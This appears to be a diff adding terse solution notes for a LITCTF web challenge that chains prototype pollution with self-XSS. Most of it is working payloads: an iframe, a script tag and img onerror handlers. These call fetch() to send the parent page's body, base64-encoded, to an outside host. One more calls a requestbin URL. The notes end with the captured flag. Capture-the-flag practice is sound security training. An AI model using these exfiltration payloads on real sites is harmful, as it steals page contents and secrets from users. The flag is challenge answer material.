@@ -1,0 +1,21 @@
+# Essentially, we prototype pollute decade and get description as the xss
+# it creates an iframe which goes to our own page, which logs into our own page again
+# finally, the self-xss grabs the flag and send it out
+
+# this gives the decade hash
+url = 3888454;
+# content
+<iframe src="http://lhsmathcs.org:8080/index.html"></iframe>
+
+Register the account:
+<script>fetch('http://lhsmathcs.org:8080/' + btoa(parent.parent.document.body.innerHTML))</script>
+
+NOT NECESSARY
+
+# decade is
+<img src="x" onerror="fetch('http://lhsmathcs.org:8080/' + btoa(parent.parent.document.body.innerHTML))">
+
+<img src="x" onerror="fetch('https://requestbin.io/1oigvpr1?testtesttest')">
+
+
+flag = LITCTF{pr0t07yp3_p0l1u710n_4nd_r3f13ct3d_x55?}
